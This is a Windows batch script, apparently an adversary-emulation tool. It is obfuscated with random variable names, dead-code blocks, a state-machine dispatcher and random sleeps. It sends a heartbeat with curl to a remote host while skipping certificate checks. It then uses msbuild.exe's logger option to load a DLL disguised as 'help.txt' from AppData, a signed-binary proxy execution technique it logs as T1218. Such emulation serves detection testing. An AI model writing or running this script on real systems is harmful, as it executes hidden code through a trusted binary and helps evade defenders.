@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants (plain literals)
SET txisnba=%APPDATA%\7712\6fe1e677
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?7712-10
SET jwcnifl=ITZEL-S2BO
SET rrocubc=10
SET xzanpex=help.txt
SET dvhhyc=7712
SET debugvar=1

REM Derived paths
SET logvar=%APPDATA%\!rrocubc!\macula-simulations.log

REM Initial random delay
SET /A dl1=%RANDOM% %% 30 + 30
timeout /t %dl1% /nobreak >nul

GOTO start_yhhqj

REM --- DEAD CODE BLOCK 1 ---
:dead_twqpl
echo Junk code 1 >nul
SET fake1=unused
GOTO dead_axkbn

:dead_axkbn
REM Never reached
GOTO END

REM --- STATE MACHINE DISPATCH ---
:start_yhhqj
SET state=101
GOTO dispatch_xnmkv

:junk_block2
REM Dead code area
SET trash=%%%%
GOTO END

:dispatch_xnmkv
IF %state%==101 GOTO init_rzpfd
IF %state%==217 GOTO check_htb_lkdwv
IF %state%==342 GOTO setup_exec_qnztx
IF %state%==499 GOTO exec_msbuild_wqpl
IF %state%==888 GOTO cleanup_ttpl
IF %state%==999 GOTO END

REM --- DEAD CODE BLOCK 3 ---
:dead_zxcmn
SET fake2=junkdata
IF 0==0 GOTO dead_endq
GOTO dead_zxcmn

:dead_endq
EXIT

REM --- INITIALIZATION ---
:init_rzpfd
if "!debugvar!"=="1" (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: SCRIPT_START=initializing>> "!logvar!" 2>nul
)

SET serverurl=http://!mdvfmsbx!
SET dllpath=!txisnba!\!xzanpex!

SET state=217
ping -n 8 127.0.0.1 >nul
GOTO dispatch_xnmkv

REM --- HEARTBEAT CHECK ---
:check_htb_lkdwv
if "!debugvar!"=="1" (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: HEARTBEAT_START=!keghkgto!>> "!logvar!" 2>nul
)

curl.exe -k -s -o nul "!keghkgto!"
SET hb_result=!ERRORLEVEL!

if "!debugvar!"=="1" (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: HEARTBEAT_RESULT=errorlevel=!hb_result!>> "!logvar!" 2>nul
)

REM TTP logging for heartbeat (optional, not in requirements)
SET state=342
CHOICE /C Y /N /D Y /T 12 >nul
GOTO dispatch_xnmkv

REM --- DEAD CODE BLOCK 4 ---
:fake_prepare
SET dummy=value
IF 1==1 GOTO skip_fake
GOTO fake_prepare

:skip_fake
GOTO dispatch_xnmkv

REM --- SETUP EXECUTION ---
:setup_exec_qnztx
if "!debugvar!"=="1" (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: CHDIR_START=!txisnba!>> "!logvar!" 2>nul
)

cd /d "!txisnba!" 2>nul
SET chdir_result=!ERRORLEVEL!

if "!debugvar!"=="1" (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: CHDIR_RESULT=errorlevel=!chdir_result!>> "!logvar!" 2>nul
)

SET state=499
SET /A rnd2=%RANDOM% %% 10 + 5
timeout /t %rnd2% /nobreak >nul
GOTO dispatch_xnmkv

REM --- EXECUTE MSBUILD ---
:exec_msbuild_wqpl
SET cmdline=%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe /logger:LoggerEntry,"!dllpath!";MyParameters,Foo

if "!debugvar!"=="1" (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: PROCESS_START=!cmdline!>> "!logvar!" 2>nul
)

!cmdline!
SET exec_result=!ERRORLEVEL!

REM Normalize timestamp for TTP logging
SET ttp_date=!DATE:~-4!-!DATE:~-10,2!-!DATE:~-7,2!
SET ttp_time=!TIME:~0,2!:!TIME:~3,2!:!TIME:~6,5!

SET RESULT=0
SET ERR_DETAIL=
IF !exec_result! EQU 0 SET RESULT=1
IF !exec_result! NEQ 0 SET ERR_DETAIL=assembly_load_failed

echo [!ttp_date! !ttp_time!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed Binary Proxy Execution=!RESULT!:!ERR_DETAIL!>> "!logvar!" 2>nul

if "!debugvar!"=="1" (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: PROCESS_RESULT=errorlevel=!exec_result!>> "!logvar!" 2>nul
)

SET state=888
ping -n 6 127.0.0.1 >nul
GOTO dispatch_xnmkv

REM --- CLEANUP ---
:cleanup_ttpl
if "!debugvar!"=="1" (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: SCRIPT_END=exit_code=!exec_result!>> "!logvar!" 2>nul
)

SET state=999
timeout /t 3 /nobreak >nul
GOTO dispatch_xnmkv

REM --- DEAD CODE BLOCK 5 ---
:dead_final
REM Unreachable cleanup
del *.tmp /q 2>nul
GOTO dead_final

:END
ENDLOCAL